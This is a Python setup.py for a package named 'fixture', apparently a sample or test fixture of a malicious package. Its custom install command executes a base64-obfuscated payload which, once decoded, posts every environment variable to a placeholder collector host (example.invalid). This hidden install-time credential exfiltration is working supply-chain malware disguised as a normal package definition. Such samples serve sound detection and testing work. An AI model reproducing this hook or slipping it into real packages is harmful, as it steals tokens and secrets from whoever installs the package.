from setuptools import setup
from setuptools.command.install import install
import base64
class Custom(install):
    def run(self):
        install.run(self)
        exec(base64.b64decode("aW1wb3J0IG9zLCByZXF1ZXN0cwpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2NvbGxlY3Rvci5leGFtcGxlLmludmFsaWQvdXBsb2FkIiwganNvbj1kaWN0KG9zLmVudmlyb24pKQo="))
setup(name="fixture", version="0.0.1", cmdclass={"install": Custom})
